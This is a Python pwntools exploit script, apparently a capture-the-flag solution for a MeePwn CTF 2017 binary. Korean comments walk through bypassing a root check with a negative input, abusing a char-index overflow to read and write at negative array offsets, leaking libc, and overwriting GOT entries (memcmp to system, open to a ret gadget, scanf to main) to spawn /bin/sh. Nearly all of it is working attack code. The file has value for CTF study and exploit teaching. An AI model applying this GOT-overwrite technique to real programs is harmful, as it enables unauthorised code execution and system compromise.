#! -*- coding:utf-8 -*-

from pwn import * 
p = process("./got_overwrite2")
# MEEPWN CTF 2017 BS

# 입력을 세번 받는다. 한번은 password , 한번은 user_id , 
# 마지막은 얼마나 많은 숫자를 정렬할지. 
# 첫째 입력 시 랜덤으로 생성된 값과 비교, 같다면 0을, 아니라면 입력한 값을 리턴한다.
# 그다음 리턴값이 0이었다면 is_root변수를 1로 세팅한다. 
# 두번째 입력값이 31미만이거나 is_root이 1이 되어야 다음으로 진행이 가능하다.
# 이때 is_root이 1이 아니면 입력값을 31 이상으로 넣어줄 수 없는데, 이러면 뒤에 진행할 leak을 비롯한 동작들이 어려워진다. 
# 결국 우리는 login 함수에서 리턴값을 0으로 만들어야 한다는거.그래야 check root에서 root 변수 값을 1로 바꿔준다.
# 이때 음수값의 입력을 막지는 않고 , checkroot 함수에서 값을 비교할때는 word 형식이다. 즉 뒷 4바이트만 0으로 만들면 된다. 
# -65536 을 넣어보자. FFFF0000 이므로 ax레지스터를 통해 0과 비교하면 같다고 나올거다. 
# 그다음 입력한 숫자만큼 입력을 더 받아서 정렬하는 동작을 하고, 
# 인덱스 번호를 가지고 값을 출력시킬 수 있다 . 여기서 주소 leak이 가능할듯. 
# 정렬 한 다음 찾을 값을 입력, 값을 찾으면 인덱스 번호를 인자로  edit 함수로 진입한다. 
# 이때 입력받는 인덱스가 전역변수다. 0x804B060 주소 위치.
# 입력값을 검색하는 루틴에서,  변수 하나가 char 형으로 선언되어 있어 인티저 오버플로우 발생, 음수값이 되는 경우가 있다.
# char형으로 충분히 큰 값은 127이 최대. 그 이상 넣으면 오버플로 발생으로 몇바퀴 돈다. 
# 따라서, array 의 음수 인덱스에 있는 값도 검색해 올 수 있다는 얘기가 된다.주소 leak을 하고 해당 주소값을 그대로 넣어주면
# 그 값을 수정할 수 있게 해준다. 
# 이제 어떤 함수를 system으로 바꿀지를 생각해보자. 이 바이너리 내에서 유일하게 내가 입력한 값이 인자가 되어 호출되는 함수가 있는데
# memcmp 함수다. 함수의 got가 0x804b014 에 있다. -19 번째 인덱스. 
# 이제 무한루프 도는부분을 탈출해야된다. 0x6ffffffe를 입력하면 탈출하는데, -41번째 인덱스에 있다. 
# 해당 입력부분을 보면, y,Y가 아닌 값을 입력시 반복문 한바퀴를 돌게하고 인덱스가 +1,  q나 Q를 입력하면 탈출한다. 
# 덮어야 하는 부분은 memcmp와 main으로 가게 만드는 함수 하나, 
# 그리고 memcmp 의 첫 인자가 fd가 아닌 입력값이 되게 만들어주려면 fd에 0이 들어가게 해서 표준입력을 받게해야한다.
# ret 0 동작을 하는 가젯을 가져와서 open함수의 got를 덮어씌워버리면 해결.  main으로가게 하는 함수는 
# 프로그램 진행에 영향을 주지 않는 scanf 함수가 적절하다. 
# 각각 인덱스는 memcmp -19 open -16 scanf -13 이고 시작 인덱스가 -41. 
# 입력 들어갈떄 십진수로 들어가야되니까 스트링으로 넣어줬어야 한다. 


cmp_offset = 0x154a20
system_offset =  0x3cd10
ret = 0x8048406
loop = 0x6fffffff
main = 0x08048942

p.sendlineafter("password:","A")
p.sendlineafter("user_id:","-65536")
p.sendlineafter("sort ?","127")

for i in range(0,127):
 	p.sendline(str(i))


p.sendlineafter("break",str(-19))

p.recvline()
rcv = int(p.recv(10),16)

libc = rcv-cmp_offset
system = libc+system_offset

log.info("addr : "+hex(libc))


p.sendline(str(-1))
p.sendlineafter("find",hex(loop))

for i in range(0,30) : 
 	if i == 22 :	#memcpy -> system
 		log.info("memcpy")
		p.sendlineafter("Do you want to edit it ?","y")
		p.sendlineafter("Enter new value",str(system))
	elif i == 25 :	#open -> ret 0 
		log.info("open")
		p.sendlineafter("Do you want to edit it ?","y")
		p.sendlineafter("Enter new value",str(ret))
	elif i == 28 :	#scanf -> main
		pause()
		log.info("main")
		p.sendlineafter("Do you want to edit it ?","y")
		p.sendlineafter("Enter new value",str(main))	
	else : 
		p.sendlineafter("Do you want to edit it ?","")
pause()
p.sendlineafter("Do you want to edit it ?","y")
p.sendline("/bin/sh")
p.sendline("/bin/sh")

p.interactive()